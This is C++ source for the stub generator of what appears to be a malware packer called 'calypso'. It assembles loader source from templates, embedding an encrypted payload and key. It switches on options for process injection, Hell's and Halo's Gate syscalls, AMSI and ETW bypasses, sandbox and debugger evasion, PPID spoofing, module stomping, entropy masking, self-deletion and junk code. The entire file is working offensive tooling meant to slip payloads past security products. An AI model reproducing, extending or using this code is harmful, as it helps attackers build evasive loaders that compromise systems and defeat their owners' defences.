#include "calypso/stub_generator.hpp"
#include "calypso/encoding.hpp"
#include "calypso/obfuscation.hpp"
#include <fstream>
#include <sstream>
#include <iostream>
#include <filesystem>
#include <regex>
#include <random>

namespace calypso {

static std::string read_file(const std::string& path) {
    std::ifstream f(path);
    if (!f.is_open()) {
        std::cerr << "[!] Cannot open stub template: " << path << std::endl;
        std::exit(1);
    }
    return std::string(std::istreambuf_iterator<char>(f),
                       std::istreambuf_iterator<char>());
}

static std::string replace_all(std::string str, const std::string& from, const std::string& to) {
    size_t pos = 0;
    while ((pos = str.find(from, pos)) != std::string::npos) {
        str.replace(pos, from.length(), to);
        pos += to.length();
    }
    return str;
}

// Process conditional blocks: {{#IF TAG}}...{{#ENDIF}}
static std::string process_conditionals(const std::string& src,
                                          const std::vector<std::string>& enabled_tags) {
    std::string result = src;

    // Find all {{#IF TAG}}...{{#ENDIF}} blocks
    auto is_enabled = [&](const std::string& tag) {
        for (auto& t : enabled_tags)
            if (t == tag) return true;
        return false;
    };

    // Process from innermost to outermost
    bool changed = true;
    while (changed) {
        changed = false;
        size_t pos = 0;
        while (pos < result.size()) {
            auto if_start = result.find("{{#IF ", pos);
            if (if_start == std::string::npos) break;

            auto tag_end = result.find("}}", if_start + 6);
            if (tag_end == std::string::npos) break;

            std::string tag = result.substr(if_start + 6, tag_end - if_start - 6);

            // Find matching ENDIF (handle nesting by counting)
            size_t search = tag_end + 2;
            int depth = 1;
            size_t endif_pos = std::string::npos;
            while (search < result.size() && depth > 0) {
                auto next_if = result.find("{{#IF ", search);
                auto next_endif = result.find("{{#ENDIF}}", search);

                if (next_endif == std::string::npos) break;

                if (next_if != std::string::npos && next_if < next_endif) {
                    depth++;
                    search = next_if + 5;
                } else {
                    depth--;
                    if (depth == 0) {
                        endif_pos = next_endif;
                    }
                    search = next_endif + 10;
                }
            }

            if (endif_pos == std::string::npos) {
                pos = tag_end + 2;
                continue;
            }

            std::string block_content = result.substr(tag_end + 2,
                                                       endif_pos - tag_end - 2);

            if (is_enabled(tag)) {
                result = result.substr(0, if_start) + block_content +
                         result.substr(endif_pos + 10);
            } else {
                result = result.substr(0, if_start) + result.substr(endif_pos + 10);
            }
            changed = true;
            break; // restart since positions shifted
        }
    }

    return result;
}

static std::vector<std::string> get_enabled_tags(const PackerConfig& cfg) {
    std::vector<std::string> tags;

    // Payload type
    switch (cfg.payload_type) {
        case PayloadType::Shellcode: break; // loader_shellcode is used
        case PayloadType::PE:        break;
        case PayloadType::CSharp:    break;
        default: break;
    }

    // Injection
    if (cfg.injection == InjectionMethod::Local)  tags.push_back("LOCAL_INJECT");
    if (cfg.injection == InjectionMethod::Remote) tags.push_back("REMOTE_INJECT");

    // Execution primitive
    switch (cfg.exec_prim) {
        case ExecutionPrimitive::Direct:   tags.push_back("EXEC_DIRECT"); break;
        case ExecutionPrimitive::Thread:   tags.push_back("EXEC_THREAD"); break;
        case ExecutionPrimitive::APC:      tags.push_back("EXEC_APC"); break;
        case ExecutionPrimitive::Callback: tags.push_back("EXEC_CALLBACK"); break;
        case ExecutionPrimitive::Fiber:    tags.push_back("EXEC_FIBER"); break;
    }

    // Syscall method
    switch (cfg.syscall_method) {
        case SyscallMethod::Indirect:
            tags.push_back("SYSCALL_INDIRECT");
            break;
        case SyscallMethod::HellsGate:
            tags.push_back("SYSCALL_HELLSGATE");
            break;
        case SyscallMethod::HalosGate:
            tags.push_back("SYSCALL_HELLSGATE");
            tags.push_back("SYSCALL_HALOSGATE");
            break;
    }

    // Crypto backend
    if (cfg.crypto_backend == CryptoBackend::CNG)     tags.push_back("CRYPTO_CNG");
    if (cfg.crypto_backend == CryptoBackend::TinyAES)  tags.push_back("CRYPTO_TINYAES");

    // Cipher
    switch (cfg.cipher) {
        case CipherMode::AES_ECB: tags.push_back("CIPHER_AES_ECB"); break;
        case CipherMode::AES_CBC: tags.push_back("CIPHER_AES_CBC"); break;
        case CipherMode::XOR:     tags.push_back("CIPHER_XOR"); break;
        case CipherMode::RC4:     tags.push_back("CIPHER_RC4"); break;
    }

    // Encoding
    switch (cfg.encoding) {
        case EncodingMethod::None:   tags.push_back("ENCODE_NONE"); break;
        case EncodingMethod::Base64: tags.push_back("ENCODE_BASE64"); break;
        case EncodingMethod::Hex:    tags.push_back("ENCODE_HEX"); break;
        case EncodingMethod::MAC:    tags.push_back("ENCODE_MAC"); break;
        case EncodingMethod::UUID:   tags.push_back("ENCODE_UUID"); break;
    }

    // Compression
    switch (cfg.compression) {
        case CompressionMethod::None: tags.push_back("COMPRESS_NONE"); break;
        case CompressionMethod::Zlib: tags.push_back("COMPRESS_ZLIB"); break;
        case CompressionMethod::LZ4:  tags.push_back("COMPRESS_LZ4"); break;
        case CompressionMethod::RLE:  tags.push_back("COMPRESS_RLE"); break;
    }

    // Evasion
    if (cfg.sleep_seconds > 0) tags.push_back("SLEEP");
    if (cfg.anti_debug)        tags.push_back("ANTI_DEBUG");
    if (cfg.self_delete)       tags.push_back("SELF_DELETE");

    if (cfg.sandbox.any()) {
        tags.push_back("SANDBOX");
        if (cfg.sandbox.diskspace) tags.push_back("SANDBOX_DISKSPACE");
        if (cfg.sandbox.memory)    tags.push_back("SANDBOX_MEMORY");
        if (cfg.sandbox.domain)    tags.push_back("SANDBOX_DOMAIN");
        if (cfg.sandbox.emulated)  tags.push_back("SANDBOX_EMULATED");
    }

    if (!cfg.unhook_dlls.empty()) tags.push_back("UNHOOK_DLLS");

    // AMSI
    if (has_flag(cfg.amsi_bypass, AmsiBypass::HWBP))              tags.push_back("AMSI_HWBP");
    if (has_flag(cfg.amsi_bypass, AmsiBypass::ContextCorrupt))     tags.push_back("AMSI_CONTEXT_CORRUPT");
    if (has_flag(cfg.amsi_bypass, AmsiBypass::ProviderDeregister)) tags.push_back("AMSI_PROVIDER_DEREGISTER");
    if (has_flag(cfg.amsi_bypass, AmsiBypass::NtCreateSectionHook)) tags.push_back("AMSI_NTCREATESECTION_HOOK");
    if (has_flag(cfg.amsi_bypass, AmsiBypass::CLRPatch))           tags.push_back("AMSI_CLR_PATCH");
    if (has_flag(cfg.amsi_bypass, AmsiBypass::Patch))              tags.push_back("AMSI_PATCH");

    // ETW
    if (has_flag(cfg.etw_bypass, EtwBypass::HWBP))           tags.push_back("ETW_HWBP");
    if (has_flag(cfg.etw_bypass, EtwBypass::ComPlus))         tags.push_back("ETW_COMPLUS");
    if (has_flag(cfg.etw_bypass, EtwBypass::ProviderDisable)) tags.push_back("ETW_PROVIDER_DISABLE");
    if (has_flag(cfg.etw_bypass, EtwBypass::UnhookNtdll))     tags.push_back("ETW_UNHOOK_NTDLL");
    if (has_flag(cfg.etw_bypass, EtwBypass::PatchEtwWrite))   tags.push_back("ETW_PATCH_ETWWRITE");
    if (has_flag(cfg.etw_bypass, EtwBypass::PatchNtTrace))    tags.push_back("ETW_PATCH_NTTRACE");
    if (has_flag(cfg.etw_bypass, EtwBypass::CallbackRemove))  tags.push_back("ETW_CALLBACK_REMOVE");

    // Output format
    if (cfg.output_format == OutputFormat::DLL)  tags.push_back("DLL_ENTRY");
    if (cfg.output_format == OutputFormat::EXE)  tags.push_back("EXE_ENTRY");

    if (cfg.verbose) tags.push_back("VERBOSE");

    if (!cfg.arguments.empty()) tags.push_back("HAS_ARGUMENTS");
    else                        tags.push_back("NO_ARGUMENTS");

    if (!cfg.ppid_process.empty()) tags.push_back("PPID_SPOOF");
    if (cfg.block_dlls)            tags.push_back("BLOCK_DLLS");
    if (cfg.obfuscate)             tags.push_back("OBFUSCATE");

    if (cfg.module_stomp) {
        tags.push_back("MODULE_STOMP");
    } else {
        tags.push_back("STANDARD_ALLOC");
    }
    if (cfg.drip_load) {
        tags.push_back("DRIP_LOAD");
    } else {
        tags.push_back("STANDARD_COPY");
    }

    if (cfg.entropy_reduce)        tags.push_back("ENTROPY_REDUCE");
    if (cfg.sleep_seconds > 0)     tags.push_back("SLEEP_IN_BETWEEN");

    return tags;
}

GeneratedStub generate_loader(const PackerConfig& cfg,
                               const std::vector<uint8_t>& encrypted_payload,
                               const std::vector<uint8_t>& key,
                               size_t original_size,
                               const std::string& stubs_dir) {
    GeneratedStub result;
    namespace fs = std::filesystem;

    // Select loader template
    std::string loader_template;
    switch (cfg.payload_type) {
        case PayloadType::Shellcode:
            loader_template = "loader_shellcode.cpp.in";
            break;
        case PayloadType::PE:
            loader_template = "loader_pe.cpp.in";
            break;
        case PayloadType::CSharp:
            loader_template = "loader_csharp.cpp.in";
            break;
        default:
            loader_template = "loader_shellcode.cpp.in";
            break;
    }

    // Read all stub templates
    std::string loader_src = read_file(stubs_dir + "/" + loader_template);
    std::string obf_src    = read_file(stubs_dir + "/obfuscate.hpp.in");
    std::string syscall_src = read_file(stubs_dir + "/syscalls.hpp.in");
    std::string crypto_src  = read_file(stubs_dir + "/crypto_stub.hpp.in");
    std::string common_src  = read_file(stubs_dir + "/common.hpp.in");
    std::string evasion_src = read_file(stubs_dir + "/evasion.hpp.in");

    // Replace #include directives with actual content (inline everything)
    auto inline_include = [](std::string& src, const std::string& inc_name,
                              const std::string& content) {
        std::string pattern = "#include \"" + inc_name + "\"";
        size_t pos = src.find(pattern);
        if (pos != std::string::npos) {
            src.replace(pos, pattern.length(), content);
        }
    };

    // Process obfuscate.hpp.in first (used by all others)
    obf_src = replace_all(obf_src, "{{OBFUSCATION_SEED}}", std::to_string(cfg.obf_seed));

    // Inline includes in evasion (it includes syscalls and obfuscate)
    inline_include(evasion_src, "obfuscate.hpp.in", "// obfuscate already included");
    inline_include(evasion_src, "syscalls.hpp.in", "// syscalls already included");

    // Inline includes in common
    inline_include(common_src, "obfuscate.hpp.in", "// obfuscate already included");

    // Inline includes in crypto_stub
    inline_include(crypto_src, "obfuscate.hpp.in", "// obfuscate already included");

    // Inline includes in syscalls
    inline_include(syscall_src, "obfuscate.hpp.in", "// obfuscate already included");

    // Inline into loader
    inline_include(loader_src, "obfuscate.hpp.in", obf_src);
    inline_include(loader_src, "syscalls.hpp.in", syscall_src);
    inline_include(loader_src, "crypto_stub.hpp.in", crypto_src);
    inline_include(loader_src, "common.hpp.in", common_src);
    inline_include(loader_src, "evasion.hpp.in", evasion_src);

    // Replace payload data (apply entropy mask if enabled)
    std::vector<uint8_t> final_payload = encrypted_payload;
    if (cfg.entropy_reduce) {
        auto mask = generate_entropy_mask(encrypted_payload.size(), cfg.obf_seed ^ 0xDEADBEEF);
        for (size_t i = 0; i < final_payload.size(); i++)
            final_payload[i] ^= mask[i];
        std::string mask_array = format_as_cpp_array(mask, "entropy_mask");
        loader_src = replace_all(loader_src, "{{ENTROPY_MASK}}", mask_array);
    }
    std::string payload_array = format_as_cpp_array(final_payload, "payload");
    loader_src = replace_all(loader_src, "{{ENCRYPTED_PAYLOAD}}", payload_array);

    // Replace key data
    std::string key_array = format_as_cpp_array(key, "key");
    loader_src = replace_all(loader_src, "{{KEY_DATA}}", key_array);

    // Replace simple placeholders
    loader_src = replace_all(loader_src, "{{PAYLOAD_SIZE}}",
                             std::to_string(encrypted_payload.size()));
    loader_src = replace_all(loader_src, "{{ORIGINAL_SIZE}}",
                             std::to_string(original_size));
    loader_src = replace_all(loader_src, "{{SLEEP_SECONDS}}",
                             std::to_string(cfg.sleep_seconds));
    loader_src = replace_all(loader_src, "{{SLEEP_IN_BETWEEN_SECONDS}}",
                             std::to_string(cfg.sleep_seconds / 2 > 0 ? cfg.sleep_seconds / 2 : 1));
    loader_src = replace_all(loader_src, "{{TARGET_PROCESS}}",
                             cfg.target_process);
    loader_src = replace_all(loader_src, "{{ARGUMENTS}}",
                             cfg.arguments);

    // Encoded payload (if encoding is used)
    if (cfg.encoding != EncodingMethod::None) {
        std::string encoded = encode_payload(encrypted_payload, cfg.encoding);
        // Escape for C string literal (handle newlines)
        std::string escaped;
        for (char c : encoded) {
            if (c == '\n') escaped += "\\n\"\n\"";
            else if (c == '"') escaped += "\\\"";
            else if (c == '\\') escaped += "\\\\";
            else escaped += c;
        }
        loader_src = replace_all(loader_src, "{{ENCODED_PAYLOAD}}", escaped);
    }

    // DLL exports — each export triggers payload execution
    if (cfg.output_format == OutputFormat::DLL) {
        std::string exports;
        auto dll_exps = cfg.dll_exports.empty()
            ? std::vector<std::string>{"Run"}
            : cfg.dll_exports;
        for (const auto& exp : dll_exps) {
            exports += "extern \"C\" __declspec(dllexport) void " + exp + "() { run_payload(); }\n";
        }
        loader_src = replace_all(loader_src, "{{DLL_EXPORTS}}", exports);
    }

    // Unhook DLL calls
    if (!cfg.unhook_dlls.empty()) {
        std::string unhook_calls;
        for (const auto& dll : cfg.unhook_dlls) {
            std::wstring wdll(dll.begin(), dll.end());
            unhook_calls += "    unhook_dll(L\"" + dll + "\");\n";
        }
        loader_src = replace_all(loader_src, "{{UNHOOK_DLL_CALLS}}", unhook_calls);
    }

    // Junk code
    if (cfg.obfuscate) {
        uint32_t seed = cfg.obf_seed;
        std::string junk;
        for (int i = 0; i < 5; i++)
            junk += generate_junk_function(seed) + "\n";
        loader_src = replace_all(loader_src, "{{JUNK_CODE_BLOCKS}}", junk);
    } else {
        loader_src = replace_all(loader_src, "{{JUNK_CODE_BLOCKS}}", "");
    }

    // Process conditional blocks
    auto tags = get_enabled_tags(cfg);
    loader_src = process_conditionals(loader_src, tags);

    // Write to temp file
    auto temp_dir = fs::temp_directory_path() / "calypso_build";
    fs::create_directories(temp_dir);

    std::string source_filename = "loader_" + std::to_string(cfg.obf_seed) + ".cpp";
    result.output_path = (temp_dir / source_filename).string();
    result.source = loader_src;

    std::ofstream out(result.output_path);
    out << loader_src;
    out.close();

    return result;
}

} // namespace calypso
